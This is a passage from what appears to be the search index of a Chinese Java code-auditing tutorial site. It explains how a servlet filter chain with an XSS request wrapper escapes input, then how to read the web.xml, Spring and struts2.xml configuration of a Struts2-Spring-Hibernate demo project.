\u65b9\u6cd5\u3002FilterChain\u53c2\u6570\u5b58\u5728\u7684\u610f\u4e49\u5c31\u5728\u4e8e\uff0c\u5728\u4e00\u4e2a Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u53ef\u4ee5\u6ce8\u518c\u591a\u4e2a Filter \u7a0b\u5e8f\uff0c\u6bcf\u4e2aFilter \u7a0b\u5e8f\u90fd\u53ef\u4ee5\u5bf9\u4e00\u4e2a\u6216\u4e00\u7ec4 Servlet \u7a0b\u5e8f\u8fdb\u884c\u62e6\u622a\u3002\u5982\u679c\u6709\u591a\u4e2a Filter \u7a0b\u5e8f\uff0c\u5c31\u53ef\u4ee5\u5bf9\u67d0\u4e2a Servlet \u7a0b\u5e8f\u7684\u8bbf\u95ee\u8fc7\u7a0b\u8fdb\u884c\u62e6\u622a\uff0c\u5f53\u9488\u5bf9\u8be5 Servlet \u7684\u8bbf\u95ee\u8bf7\u6c42\u5230\u8fbe\u65f6\uff0cWeb \u5bb9\u5668\u5c06\u628a\u591a\u4e2a Filter \u7a0b\u5e8f\u7ec4\u5408\u6210\u4e00\u4e2a Filter \u94fe\uff08\u4e5f\u53eb\u4f5c\u8fc7\u6ee4\u5668\u94fe\uff09\u3002</p> <p>Filter \u94fe\u4e2d\u7684\u5404\u4e2a Filter \u7684\u62e6\u622a\u987a\u5e8f\u4e0e\u5b83\u4eec\u5728 web.xml \u6587\u4ef6\u4e2d\u7684\u6620\u5c04\u987a\u5e8f\u4e00\u81f4\uff0c\u5728\u4e0a\u4e00\u4e2a Filter.doFilter \u65b9\u6cd5\u4e2d\u8c03\u7528 FilterChain.doFilter \u65b9\u6cd5\u5c06\u6fc0\u6d3b\u4e0b\u4e00\u4e2aFilter \u7684 doFilter \u65b9\u6cd5\uff0c\u6700\u540e\u4e00\u4e2a Filter.doFilter \u65b9\u6cd5\u4e2d\u8c03\u7528\u7684 FilterChain.doFilter \u65b9\u6cd5\u5c06\u6fc0\u6d3b\u76ee\u6807 Servlet \u7684 service \u65b9\u6cd5\u3002</p> <p>\u53ea\u8981 Filter \u94fe\u4e2d\u4efb\u610f\u4e00\u4e2a Filter \u6ca1\u6709\u8c03\u7528 FilterChain.doFilter \u65b9\u6cd5\uff0c\u5219\u76ee\u6807Servlet \u7684 service \u65b9\u6cd5\u5c31\u90fd\u4e0d\u4f1a\u88ab\u6267\u884c\u3002</p> <p>\u8bfb\u8005\u5e94\u8be5\u53d1\u73b0\uff0c\u867d\u7136 FilterChain \u540d\u79f0\u770b\u8d77\u6765\u50cf\u8fc7\u6ee4\u5668\uff0c\u4f46\u662f\u8c03\u7528 chain.dofilter\u65b9\u6cd5\u4f3c\u4e4e\u5e76\u6ca1\u6709\u6267\u884c\u4efb\u4f55\u7c7b\u4f3c\u8fc7\u6ee4\u7684\u5de5\u4f5c\uff0c\u4e5f\u6ca1\u6709\u4efb\u4f55\u7c7b\u4f3c\u9ed1\u540d\u5355\u6216\u8005\u767d\u540d\u5355\u7684\u8fc7\u6ee4\u89c4\u5219\u3002</p> <p>\u5728\u8c03\u7528 chain.dofilter \u65b9\u6cd5\u65f6\uff0c\u6211\u4eec\u4f20\u9012\u4e86\u4e24\u4e2a\u53c2\u6570\uff1a<code>new XSSRequestWrapper ((HttpServletRequest) request)</code>\u548c<code>response</code>\uff0c\u5c31\u662f\u8bf4\u6211\u4eec\u4f20\u9012\u4e86\u4e00\u4e2a <code>XSSRequestWrapper</code>\u5bf9\u8c61\u548c <code>ServletRespons</code>\u5bf9\u8c61\uff0c\u6211\u4eec\u5173\u5fc3\u7684\u5f53\u7136\u662f\u8fd9\u4e2a <code>XSSRequestWrapper</code>\u5bf9\u8c61\u3002</p> <p>\u5728\u4f20\u9012\u53c2\u6570\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7\u8c03\u7528 XSSRequestWrapper \u7684\u6784\u9020\u5668\u4f20\u9012\u4e86HttpServletRequest \u5bf9\u8c61\uff0c\u8fd9\u91cc\u7b80\u5355\u4ece\u7ee7\u627f\u5173\u7cfb\u5411\u8bfb\u8005\u5c55\u793a HttpServletRequest \u548cServletRequest \u7684\u5173\u7cfb\uff0c\u5982\u56fe</p> <p></p> <p>\u8fd9\u91cc\u751f\u6210\u4e00\u4e2a XSSRequestWrapper \u5bf9\u8c61\u5e76\u4f20\u5165\u4e86\u53c2\u6570\uff0c\u5982\u56fe</p> <p></p> <p>filter \u4e0b\u9762\u6709\u4e00\u4e2a\u53eb\u4f5c XSSRequestWrapper \u7684\u7c7b\uff0c\u5982\u56fe</p> <p>\u53ef\u4ee5\u53d1\u73b0\u8fc7\u6ee4\u884c\u4e3a\u5728\u8fd9\u91cc\u8fdb\u884c\uff0c\u800c XssFilter \u7684\u5b58\u5728\u53ea\u662f\u5728\u94fe\u5f0f\u6267\u884c\u8fc7\u6ee4\u5668\uff0c\u5e76\u6700\u7ec8\u5c06\u503c\u4f20\u7ed9 Servlet \u65f6\u8c03\u7528 XSSRequestWrapper \u6765\u8fdb\u884c\u8fc7\u6ee4\u5e76\u83b7\u53d6\u8fc7\u6ee4\u7ed3\u679c\u3002</p> <p>\u53ef\u80fd\u6709\u8bb8\u591a\u8bfb\u8005\u4e0d\u660e\u767d\u4e3a\u4ec0\u4e48\u4e0d\u5c06\u8fc7\u6ee4\u7684\u903b\u8f91\u4ee3\u7801\u5199\u5728 XssFilter \u4e2d\uff0c\u800c\u662f\u91cd\u65b0\u7f16\u5199\u4e00\u4e2a\u7c7b\uff1f\u8fd9\u6837\u505a\u9996\u5148\u662f\u4e3a\u4e86\u89e3\u8026\uff0c\u5176\u6b21\u662f\u56e0\u4e3a XSSRequestWrapper \u7ee7\u627f\u4e86\u4e00\u4e2a\u7c7b HttpServletRequestWrapper\u3002</p> <p>\u67e5\u770b HttpServletRequestWrapper \u7c7b\u7684\u7ee7\u627f\u5173\u7cfb\uff0c\u5982\u56fe</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230 HttpServletRequestWrapper \u5b9e\u73b0\u4e86 HttpServletRequest \u63a5\u53e3\u3002\u6211\u4eec\u7684\u60f3\u6cd5\u662f\u5c3d\u53ef\u80fd\u5c06\u8bf7\u6c42\u4e2d\u6709\u5371\u5bb3\u7684\u6570\u636e\u6216\u8005\u7279\u6b8a\u7b26\u53f7\u8fc7\u6ee4\u6389\uff0c\u7136\u540e\u5c06\u8fc7\u6ee4\u540e\u7684\u6570\u636e\u8f6c\u53d1\u5411\u540e\u9762\u7684\u4e1a\u52a1\u4ee3\u7801\u5e76\u7ee7\u7eed\u6267\u884c\uff0c\u800c\u4e0d\u662f\u53d1\u73b0\u8bf7\u6c42\u6570\u636e\u4e2d\u6709\u7279\u6b8a\u5b57\u7b26\u5c31\u76f4\u63a5\u505c\u6b62\u6267\u884c\uff0c\u629b\u51fa\u5f02\u5e38\uff0c\u8fd4\u56de\u7ed9\u7528\u6237\u4e00\u4e2a 400 \u9875\u9762\u3002\u56e0\u6b64\u8981\u4fee\u6539\u6216\u8005\u8f6c\u4e49 HttpServletRequest \u5bf9\u8c61\u4e2d\u7684\u6076\u610f\u6570\u636e\u6216\u8005\u7279\u6b8a\u5b57\u7b26\u3002\u7136\u800c HttpServletRequest \u5bf9\u8c61\u4e2d\u7684\u6570\u636e\u4e0d\u5141\u8bb8\u88ab\u4fee\u6539\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0cHttpServletRequest \u5bf9\u8c61\u6ca1\u6709\u4e3a\u7528\u6237\u63d0\u4f9b\u76f4\u63a5\u4fee\u6539\u8bf7\u6c42\u6570\u636e\u7684\u65b9\u6cd5\u3002</p> <p>XSSRequestWrapper \u7c7b\uff1a</p> <p></p> <p>\u56e0\u6b64\u5c31\u9700\u8981\u7528\u5230 HttpServletRequestWrapper \u7c7b\uff0c\u8fd9\u91cc\u7528\u5230\u4e86\u5e38\u89c1\u7684 23 \u79cd\u4e2d\u8bbe\u8ba1\u6a21\u5f0f\u4e4b\u4e00\u7684\u88c5\u9970\u8005\u6a21\u5f0f\uff0c\u9650\u4e8e\u7bc7\u5e45\u539f\u56e0\u8fd9\u91cc\u4e0d\u5bf9\u88c5\u9970\u8005\u6a21\u5f0f\u8fdb\u884c\u8bb2\u89e3\uff0c\u611f\u5174\u8da3\u7684\u8bfb\u8005\u53ef\u4ee5\u81ea\u884c\u7814\u7a76\u3002HttpServletRequestWrapper \u7c7b\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u4fee\u6539 request \u8bf7\u6c42\u6570\u636e\u7684\u65b9\u6cd5\uff0c\u8fd9\u4e5f\u662f\u9700\u8981\u5355\u5199\u4e00\u4e2a\u7c7b\u6765\u8fdb\u884c\u8fc7\u6ee4\u7684\u539f\u56e0\uff0c\u662f\u56e0\u4e3a\u6846\u67b6\u5c31\u662f\u8fd9\u4e48\u8bbe\u8ba1\u7684\u3002</p> <p>\u5f53 HttpServletRequestWrapper \u8fc7\u6ee4\u5b8c\u8bf7\u6c42\u4e2d\u7684\u6570\u636e\u5e76\u5b8c\u6210\u4fee\u6539\u540e\uff0c\u8fd4\u56de\u5e76\u4f5c\u4e3achain.doFilter \u65b9\u6cd5\u7684\u5f62\u53c2\u8fdb\u884c\u4f20\u9012\u3002</p> <p>\u6700\u540e\u4e00\u4e2a Filter.doFilter \u65b9\u6cd5\u4e2d\u8c03\u7528\u7684 FilterChain.doFilter \u65b9\u6cd5\u5c06\u6fc0\u6d3b\u76ee\u6807Servlet \u7684 service \u65b9\u6cd5\u3002</p> <p>\u7531\u4e8e\u6211\u4eec\u6ca1\u6709\u914d\u7f6e\u7b2c\u4e8c\u4e2a Filter\uff0c\u56e0\u6b64 XssFilter \u4e2d\u7684 chain.doFilter \u5c06\u4f1a\u6fc0\u6d3bServlet \u7684 service \u65b9\u6cd5\uff0c\u5373 DispatcherServlet \u7684 service \u65b9\u6cd5\uff0c\u7136\u540e\u6570\u636e\u5c06\u4f20\u5165 Spring MVC \u7684 Controller \u5c42\u5e76\u4ea4\u7531 BookController \u6765\u5904\u7406\u3002</p> <p>\u73b0\u5728\u4f7f\u7528 Filter \u6765\u6f14\u793a\u6548\u679c\u3002\u9996\u5148\u8bbe\u7f6e\u65ad\u70b9\uff0c\u5982\u56fe</p> <p></p> <p>\u518d\u6b21\u6267\u884c\u5230\u8fd9\u91cc\u65f6\uff0cXSS \u8bed\u53e5\u4e2d\u7684\u7279\u6b8a\u5b57\u7b26\u5df2\u7ecf\u88ab Filter \u8f6c\u4e49\uff0c\u81ea\u7136\u4e5f\u4e0d\u4f1a\u5b58\u5728 XSS \u7684\u95ee\u9898\u4e86\u3002</p> <p>XSS \u8bed\u53e5\u4e2d\u7684\u7279\u6b8a\u5b57\u7b26\u88ab Filter \u8f6c\u4e49\uff1a</p> <p></p> <p>XSS \u8bed\u53e5\u88ab\u8f6c\u79fb\uff1a</p> <p></p>"},{"location":"Code_audit/Java/Java-5/SSH/index.html","title":"Java EE \u5f00\u53d1\u6846\u67b6\u5b89\u5168\u5ba1\u8ba1","text":""},{"location":"Code_audit/Java/Java-5/SSH/index.html#_1","title":"\u5f00\u53d1\u6846\u67b6\u5ba1\u8ba1\u6280\u5de7","text":""},{"location":"Code_audit/Java/Java-5/SSH/index.html#ssh","title":"SSH \u6846\u67b6\u5ba1\u8ba1\u6280\u5de7","text":""},{"location":"Code_audit/Java/Java-5/SSH/index.html#1ssh","title":"1\uff0eSSH \u6846\u67b6\u7b80\u4ecb","text":"<p>\u524d\u9762\u4ecb\u7ecd\u4e86 SSM \u6846\u67b6\uff0c\u5373 Spring MVC\u3001Spring \u548c MyBatis\u3002\u63a5\u4e0b\u6765\u4ecb\u7ecd Java Web\u66fe\u7ecf\u5f00\u53d1\u7684 SSH \u6846\u67b6\uff0c\u5373 <code>Struts2</code>\u3001S<code>pring</code> \u548c <code>Hibernate</code>\u3002</p> <p>\u81ea Struts2 \u8bde\u751f\u4ee5\u6765\uff0c\u6f0f\u6d1e\u5c42\u51fa\u4e0d\u7a77\uff0c\u76f4\u5230\u6700\u8fd1\u7684 S2-059 \u548c S2-060\uff0c\u9ad8\u5371\u6f0f\u6d1e\u4ecd\u7136\u4e0d\u8ba1\u5176\u6570\u3002\u7531\u4e8e\u5b89\u5168\u4e0a\u7684\u79cd\u79cd\u539f\u56e0\uff0c\u4ee5\u53ca Spring MVC \u548c Spring Boot \u7b49\u6846\u67b6\u7684\u5174\u8d77\uff0cStruts2 \u9010\u6e10\u6de1\u51fa\u4e86\u5f00\u53d1\u4eba\u5458\u7684\u89c6\u91ce\u3002\u4f46\u662f\u5f88\u591a\u4f01\u4e1a\u7684\u9879\u76ee\u8fd8\u662f\u4f7f\u7528 Struts2 \u8fdb\u884c\u5f00\u53d1\u7684\uff0c\u6240\u4ee5 Java \u4ee3\u7801\u5ba1\u8ba1\u4eba\u5458\u975e\u5e38\u6709\u5fc5\u8981\u4e86\u89e3\u8be5\u6846\u67b6\u7684\u5ba1\u8ba1\u65b9\u6cd5\u3002</p> <p>\u63a5\u4e0b\u6765\u4ecb\u7ecd DAO \u5c42\u7684\u6846\u67b6\uff0c\u5b83\u548c MyBatis \u4e00\u6837\u540c\u4e3a ORM \u6846\u67b6\u7684 Hibernate\u3002\u867d\u7136\u4e8c\u8005\u540c\u4e3a ORM \u6846\u67b6\uff0c\u4f46\u662f\u533a\u522b\u8fd8\u662f\u633a\u5927\u7684\uff0c\u540e\u7eed\u8bb2\u89e3\u4e2d\u4f1a\u4ecb\u7ecd\u4e24\u4e2a\u6846\u67b6\u4e4b\u95f4\u7684\u533a\u522b\uff0c\u4ee5\u53ca\u5ba1\u8ba1 Hibernate \u65f6\u7684\u6ce8\u610f\u4e8b\u9879\u3002</p>"},{"location":"Code_audit/Java/Java-5/SSH/index.html#2java-ssh","title":"2\uff0eJava SSH \u6846\u67b6\u5ba1\u8ba1\u6280\u5de7","text":"<p>\u6211\u4eec\u5c06\u524d\u9762\u7684 SSM \u7684 Demo \u8fdb\u884c\u91cd\u5199,\u65b9\u4fbf\u4e24\u4e2a\u6846\u67b6\u4e4b\u95f4\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u800c\u52a0\u6df1\u7406\u89e3\uff0c\u9879\u76ee\u76ee\u5f55\u7ed3\u6784\u5982\u56fe</p> <p></p> <p>\u5982\u524d\u6240\u8ff0\uff0c\u5728\u6709 web.xml \u7684\u60c5\u51b5\u4e0b\uff0c\u5ba1\u8ba1\u4e00\u4e2a\u9879\u76ee\u65f6\u9996\u5148\u9700\u8981\u67e5\u770b\u8be5\u6587\u4ef6\uff0c\u4ee5\u4fbf\u5bf9\u6574\u4e2a\u9879\u76ee\u6709\u4e00\u4e2a\u521d\u6b65\u7684\u4e86\u89e3\u3002</p> <p>web.xml \u5185\u5bb9\u5982\u56fe</p> <p></p> <p>web.xml \u6587\u4ef6\u4e2d,\u7b2c\u4e00\u9879\u914d\u7f6e\u8868\u660e\u4e86 Spring \u914d\u7f6e\u6587\u4ef6\u7684\u6240\u5728\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u9879\u914d\u7f6e\u662f\u4e00\u4e2a Filter\uff0c\u8fd9\u91cc\u660e\u663e\u4e0d\u540c\u4e8e SSM \u4e2d web.xml \u7684\u914d\u7f6e\uff0c\u672c\u8d28\u4e0a\u90fd\u662f Tomcat \u901a\u8fc7\u52a0\u8f7dweb.xml \u6587\u4ef6\u8bfb\u53d6\u5176\u4e2d\u7684\u4fe1\u606f\u6765\u5224\u65ad\u5c06\u524d\u7aef\u7684\u8bf7\u6c42\u4ea4\u7531\u8c01\u8fdb\u884c\u5904\u7406\u3002Spring MVC \u7684\u9009\u62e9\u662f\u914d\u7f6e\u4e00\u4e2a Servlet\uff0c\u800c Struts2 \u7684\u9009\u62e9\u662f\u914d\u7f6e\u4e00\u4e2a Filter\u3002\u800c\u4e14\u7ec6\u5fc3\u7684\u8bfb\u8005\u8fd8\u4f1a\u53d1\u73b0\uff0c\u5728\u914d\u7f6e Spring MVC \u7684 <code>DispatcherServlet</code> \u65f6\uff0cSpring \u914d\u7f6e\u6587\u4ef6\uff08\u4e5f\u5c31\u662f<code>applicationContext.xml</code> \u4f4d\u7f6e\uff09\u662f\u76f4\u63a5\u901a\u8fc7\u914d\u7f6e\u53c2\u6570\u4f20\u5165\u7684\uff0c\u800c\u8fd9\u91cc\u5219\u662f\u901a\u8fc7\u914d\u7f6e\u4e00\u4e2a<code>context-param</code>\u3002</p> <p>Struts2 \u914d\u7f6e Filter\uff0c\u800c Spring MVC \u914d\u7f6e Servlet\uff0c\u63a5\u4e0b\u6765\u67e5\u770b applicationContext.xml\uff0c\u8be5\u914d\u7f6e\u6587\u4ef6\u5185\u5bb9\u5982\u56fe</p> <p></p> <p>\u8be5\u6587\u4ef6\u4e2d\u4e3b\u8981\u914d\u7f6e\u4e86\u9879\u76ee\u6240\u9700\u7684\u5404\u79cd bean\uff0c\u8fd9\u91cc\u53ef\u4ee5\u6e05\u695a\u5730\u770b\u5230\u4f7f\u7528\u7684\u662f c3p0\u7684\u8fde\u63a5\u6c60\u3002\u63a5\u7740\u662f\u914d\u7f6e sessionFactory\uff0c\u5e76\u5c06\u8fde\u63a5\u6c60\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\uff0c\u540c\u65f6\u4f5c\u4e3a\u53c2\u6570\u4f20\u8f93\u7684\u8fd8\u6709\u4e00\u4e2a hibernate \u7684\u603b\u914d\u7f6e\u6587\u4ef6\uff0c\u4ee5\u53ca\u4e00\u4e2a hibernate \u7684\u6620\u5c04\u6587\u4ef6\u3002\u63a5\u4e0b\u6765\u662f\u914d\u7f6e\u6bcf\u4e2a Action \u7684 bean \u5bf9\u8c61\u3002</p> <p>\u67e5\u770b\u5b8c Spring \u7684\u914d\u7f6e\u6587\u4ef6\u540e\uff0c\u5728\u5ba1\u8ba1 SSH \u6846\u67b6\u7684\u4ee3\u7801\u4e4b\u524d\u8fd8\u9700\u8981\u5bf9\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u6709\u6240\u4e86\u89e3\uff0c\u5373 Struts2 \u7684\u6838\u5fc3\u914d\u7f6e\u6587\u4ef6 <code>struts2.xml</code>\uff0c\u8be5\u914d\u7f6e\u6587\u4ef6\u7684\u8be6\u7ec6\u5185\u5bb9\u5982\u56fe:</p> <p></p> <p>struts2.xml\u6587\u4ef6\u662fStruts 2\u6846\u67b6\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6\u4e4b\u4e00\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u914d\u7f6e\u548c\u5b9a\u4e49Struts 2\u6846\u67b6\u4e2d\u7684\u52a8\u4f5c\uff08Action\uff09\u3001\u62e6\u622a\u5668\uff08Interceptor\uff09\u3001\u7ed3\u679c\uff08Result\uff09\u4ee5\u53ca\u5176\u4ed6\u76f8\u5173\u7ec4\u4ef6\u3002\u5728\u9879\u76ee\u4e2d\uff0cstruts2.xml\u6587\u4ef6\u8d77\u7740\u975e\u5e38\u91cd\u8981\u7684\u4f5c\u7528\uff0c\u5b83\u5b9a\u4e49\u4e86\u9879\u76ee\u4e2d\u7684\u5404\u79cd\u884c\u4e3a\u548c\u7ec4\u4ef6\u4e4b\u95f4\u7684\u5173\u7cfb\u548c\u6d41\u7a0b\uff0c\u5305\u62ec\uff1a</p> <p>\u914d\u7f6e\u52a8\u4f5c\uff08Action\uff09\uff1a\u6307\u5b9a\u4e86\u8bf7\u6c42URL\u4e0e\u76f8\u5e94\u7684\u5904\u7406\u7c7b\u4e4b\u95f4\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u5b9a\u4e49\u4e86\u8bf7\u6c42\u53c2\u6570\u5982\u4f55\u4f20\u9012\u7ed9\u5904\u7406\u7c7b\uff0c\u5e76\u6307\u5b9a\u4e86\u5904\u7406\u7ed3\u679c\u5e94\u8be5\u5982\u4f55\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002</p> <p>\u5b9a\u4e49\u62e6\u622a\u5668\uff08Interceptor\uff09\uff1a\u6307\u5b9a\u4e86\u5728\u6267\u884c\u52a8\u4f5c\u4e4b\u524d\u3001\u4e4b\u540e\u6216\u8005\u53d1\u751f\u5f02\u5e38\u65f6\u9700\u8981\u6267\u884c\u7684\u62e6\u622a\u5668\uff0c\u7528\u4e8e\u5728\u8bf7\u6c42\u5904\u7406\u7684\u4e0d\u540c\u9636\u6bb5\u8fdb\u884c\u9884\u5904\u7406\u6216\u540e\u5904\u7406\u64cd\u4f5c\uff0c\u6bd4\u5982\u65e5\u5fd7\u8bb0\u5f55\u3001\u6743\u9650\u9a8c\u8bc1\u7b49\u3002</p> <p>\u914d\u7f6e\u7ed3\u679c\uff08Result\uff09\uff1a\u5b9a\u4e49\u4e86\u5904\u7406\u5b8c\u6210\u540e\u7684\u8fd4\u56de\u7ed3\u679c\uff0c\u5305\u62ec\u8f6c\u53d1\u3001\u91cd\u5b9a\u5411\u3001\u76f4\u63a5\u8f93\u51fa\u5185\u5bb9\u7b49\u3002</p> <p>\u914d\u7f6e\u5168\u5c40\u53c2\u6570\uff1a\u53ef\u4ee5\u5728struts2.xml\u6587\u4ef6\u4e2d\u914d\u7f6e\u5168\u5c40\u7684\u53c2\u6570\uff0c\u5982\u56fd\u9645\u5316\u3001\u5f02\u5e38\u5904\u7406\u65b9\u5f0f\u3001\u5f00\u53d1\u6a21\u5f0f\u7b49\u3002</p> <p>\u8be5\u914d\u7f6e\u6587\u4ef6\u4e2d\u914d\u7f6e\u4e86 Sturts2 \u4e2d\u6700\u6838\u5fc3\u7684\u90e8\u5206\uff0c\u5373\u6240\u8c13\u7684 Action\u3002</p> <p>\u8fd9\u91cc\u914d\u7f6e\u7684\u6bcf\u4e00\u4e2a Action \u90fd\u6709\u5176\u5bf9\u5e94\u7684\u8bf7\u6c42 URI \u548c\u5904\u7406\u8be5\u8bf7\u6c42\u7684 Class\uff0c\u4ee5\u53ca\u6240\u5bf9\u5e94\u7684\u65b9\u6cd5\u3002\u6211\u4eec\u5148\u4ece allBook \u8fd9\u4e2a action \u5f00\u59cb\u8bb2\u89e3\uff0c\u8be5\u529f\u80fd\u7528\u4e8e\u9996\u9875\u6240\u6709\u4e66\u7c4d\u7684\u5c55\u793a\u3002</p> <p>allBook action \u5bf9\u5e94\u7684class \u7684\u5168\u9650\u5b9a\u7c7b\u540d\u662fcom.sshProject.action.QueryAllBookAction\u3002class \u5c5e\u6027\u540e\u9762\u8fd8\u6709\u4e00\u4e2a method \u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u7684\u4f5c\u7528\u5c31\u662f\u6267\u884c\u6307\u5b9a\u7684\u65b9\u6cd5\uff0c\u9ed8\u8ba4\u503c\u4e3a\u201cexecute\u201d\uff0c\u5f53\u4e0d\u4e3a\u8be5\u5c5e\u6027\u8d4b\u503c\u65f6\uff0c\u9ed8\u8ba4\u6267\u884c Action \u7684\u201cexecute\u201d\u65b9\u6cd5\u3002</p> <p>\u6bcf\u4e2a action \u6807\u7b7e\u4e2d\u8fd8\u4f1a\u6709\u4e00\u4e9b result \u5b50\u6807\u7b7e\uff0c\u8be5\u6807\u7b7e\u6709\u4e24\u4e2a\u5c5e\u6027\uff0c\u5206\u522b\u662f name\u5c5e\u6027\u548c type \u5c5e\u6027\u3002name \u5c5e\u6027\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u5339\u914d\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u9009\u62e9\u4e0e\u4e4b\u5bf9\u5e94\u7684\u9875\u9762\u3002\u8fd9\u91cc\u5f53 QueryAllBookAction \u6267\u884c\u5b8c\u6210\u540e\uff0c\u5982\u679c\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u662f success\uff0c\u5219\u8fd4\u56dequeryBookByID.jsp\uff1b\u5982\u679c\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u662f false\uff0c\u5219\u8fd4\u56de error.jsp\u3002</p> <p>result \u4e2d\u8fd8\u6709\u4e00\u4e2a\u5e38\u7528\u5c5e\u6027\u662f type\u3002type \u5c5e\u6027\u7684\u503c\u4ee3\u8868\u53bb\u5f80 JSP \u9875\u9762\u662f\u901a\u8fc7\u8f6c\u53d1\u8fd8\u662f\u901a\u8fc7\u91cd\u5b9a\u5411\u3002\u8f6c\u53d1\u548c\u91cd\u5b9a\u5411\u8fd9\u4e24\u79cd\u65b9\u5f0f\u7684\u533a\u522b\u4e3a\uff0c\u8f6c\u53d1\u662f\u670d\u52a1\u7aef\u81ea\u5df1\u7684\u884c\u4e3a\uff0c\u5728\u8f6c\u53d1\u7684\u8fc7\u7a0b\u4e2d\u643a\u5e26 Controller\u5c42\u6267\u884c\u540e\u7684\u8fd4\u56de\u7ed3\u679c\uff1b\u800c\u91cd\u5b9a\u5411\u5219\u9700\u8981\u5ba2\u6237\u7aef\u7684\u53c2\u4e0e\uff0c\u901a\u8fc7 300 \u72b6\u6001\u7801\u8ba9\u5ba2\u6237\u7aef\u5bf9\u6307\u5b9a\u9875\u9762\u91cd\u65b0\u53d1\u8d77\u8bf7\u6c42\u3002</p> <p>\u4ecb\u7ecd\u5b8c Action \u6807\u7b7e\u4e2d\u7684\u5e38\u89c1\u5c5e\u6027\uff0c\u4e0b\u4e00\u6b65\u5c31\u662f\u8ffd\u8e2a QueryAllBookAction \u8fd9\u4e2a\u7c7b\uff0c\u6765\u8be6\u7ec6\u89c2\u5bdf\u5176\u4e2d\u7684\u5185\u5bb9\u3002\u6839\u636e result \u7684\u6807\u7b7e\u7684\u914d\u7f6e\uff0cstruts2 \u4f1a\u6267\u884c QueryAllBookAction\u7c7b\u7684 execute \u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u7684\u5b9e\u73b0\u8fc7\u7a0b\u5982\u56fe</p> <p></p> <p>\u5982\u679c\u53ea\u770b execute \u65b9\u6cd5\u7684\u5185\u5bb9\uff0c\u53ef\u80fd\u4f1a\u4e0d\u592a\u6e05\u695a\u5176\u4e2d\u7684\u4e00\u4e9b\u53d8\u91cf\u662f\u5982\u4f55\u83b7\u53d6\u7684\u3002QueryAllBookAction \u7c7b\u7684\u5269\u4f59\u90e8\u5206\u5982\u56fe</p> <p></p> <p>\u8fd9\u91cc\u7684 bookService \u5c31\u662f Web \u4e09\u5c42\u67b6\u6784\u4e2d\u670d\u52a1\u5c42\u7684\u90e8\u5206\u3002setBookService \u65b9\u6cd5\u5728\u5f53\u524d QueryAllBookAction \u5b9e\u4f8b\u5316\u65f6\u4f1a\u88ab\u4e00\u4e2a\u540d\u4e3a params \u7684\u62e6\u622a\u5668\u8fdb\u884c\u8c03\u7528\uff0c\u5e76\u4e3abookService \u53d8\u91cf\u8fdb\u884c\u8d4b\u503c\u3002</p> <p>\u5b9e\u4f8b\u5316 QueryAllBookAction \u53d1\u751f\u5728\u5ba2\u6237\u7aef\u53d1\u8d77\u8bf7\u6c42\u5e76\u4e14Struts 2\u6846\u67b6\u63a5\u6536\u5230\u8be5\u8bf7\u6c42\u65f6\u3002\u5f53\u5ba2\u6237\u7aef\u8bf7\u6c42\u4e0e QueryAllBookAction \u76f8\u5173\u7684 URL \u65f6\uff0cStruts 2 \u6846\u67b6\u4f1a\u6839\u636e struts2.xml \u4e2d\u7684\u914d\u7f6e\uff0c\u5b9e\u4f8b\u5316 QueryAllBookAction\uff0c\u5e76\u5c06\u8bf7\u6c42\u53c2\u6570\u4f20\u9012\u7ed9\u5b83\u3002</p> <p>\u62e6\u622a\u5668\u5728 Struts 2 \u4e2d\u7528\u4e8e\u5728\u8bf7\u6c42\u5904\u7406\u7684\u4e0d\u540c\u9636\u6bb5\u8fdb\u884c\u9884\u5904\u7406\u6216\u540e\u5904\u7406\u64cd\u4f5c\u3002\u5728\u63d0\u5230\u7684\u60c5\u666f\u4e2d\uff0c\u63cf\u8ff0\u4e86\u4e00\u4e2a\u540d\u4e3a params \u7684\u62e6\u622a\u5668\uff0c\u8be5\u62e6\u622a\u5668\u5728 QueryAllBookAction \u5b9e\u4f8b\u5316\u65f6\u8c03\u7528 setBookService \u65b9\u6cd5\uff0c\u4e3a bookService \u53d8\u91cf\u8fdb\u884c\u8d4b\u503c\u3002\u8fd9\u610f\u5473\u7740\u5728 QueryAllBookAction \u5b9e\u4f8b\u5316\u65f6\uff0cparams \u62e6\u622a\u5668\u4f1a\u88ab\u8c03\u7528\uff0c\u7528\u6765\u5904\u7406\u8bf7\u6c42\u53c2\u6570\uff0c\u5e76\u5728\u5fc5\u8981\u65f6\u4e3a QueryAllBookAction \u7684\u5c5e\u6027\u8fdb\u884c\u8bbe\u7f6e\uff0c\u5176\u4e2d\u5305\u62ec\u4e86 bookService \u53d8\u91cf\u7684\u8d4b\u503c\u64cd\u4f5c\u3002</p> <p>QueryAllBookAction\u9664\u7ee7\u627fActionSupport\u8fd9\u4e2a\u7236\u7c7b\u4ee5\u5916\uff0c\u8fd8\u5b9e\u73b0\u4e86RequestAware\u63a5\u53e3\uff0c\u8be5\u63a5\u53e3\u5185\u5bb9\u5982\u56fe</p> <p></p> <p>\u8be5\u63a5\u53e3\u5185\u53ea\u6709\u4e00\u4e2a\u65b9\u6cd5\uff0c\u76ee\u7684\u662f\u83b7\u53d6 request \u5bf9\u8c61\u4e2d\u7684\u5168\u90e8 attributes \u7684\u4e00\u4e2a map\u5982\u679c\u60f3\u8981\u83b7\u53d6\u6574\u4e2a request \u5bf9\u8c61\uff0c\u5219\u9700\u8981\u5b9e\u73b0 ServletRequestAware\uff0c\u8be5\u63a5\u53e3\u5185\u5bb9\u5982\u56fe</p> <p></p> <p>\u5728\u4ecb\u7ecd\u5b8c QueryAllBookAction 